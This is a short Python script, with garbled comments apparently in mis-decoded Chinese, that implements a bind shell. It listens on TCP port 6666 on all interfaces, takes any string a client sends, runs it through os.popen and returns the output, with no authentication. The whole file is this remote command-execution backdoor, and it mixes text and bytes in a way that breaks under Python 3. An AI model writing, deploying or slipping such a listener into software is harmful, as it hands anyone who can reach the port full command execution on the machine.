#coding: utf-8
from socket import *
from os import *


s = socket(AF_INET, SOCK_STREAM)
# ��һ��������"������֮������ͨ��", �ڶ���������"��ʽsocket , for TCP"
s.bind(('', 6666))
# ���׽��ְ󶨵���ַ����һ�������ǰ󶨱������ض��������Ƕ˿ں�6666
s.listen(1)
# ��ʼ�����������ӣ�������������ֱ�ʾ�����������
while True:
# ����һ��ѭ��
	sock, addr = s.accept()
	# �������Ӳ����أ�conn,address��,����conn���µ��׽��ֶ��󣬿����������պͷ������ݡ�address�����ӿͻ��˵ĵ�ַ��
	print('Connect by ', addr)
	# ��ӡ
	while True:
	# ѭ��
		cmd = sock.recv(1024)
		# ������Ϣ
		if cmd == 'exit':
		# �ж��Ƿ�Ϊexit
			sock.close()
			# �Ͽ�����
			break
			# ����ѭ��
		result = popen(cmd).read()
		# ִ��������յ���cmd����
		sock.send(result)
		# ����ִ��cmd����Ľ��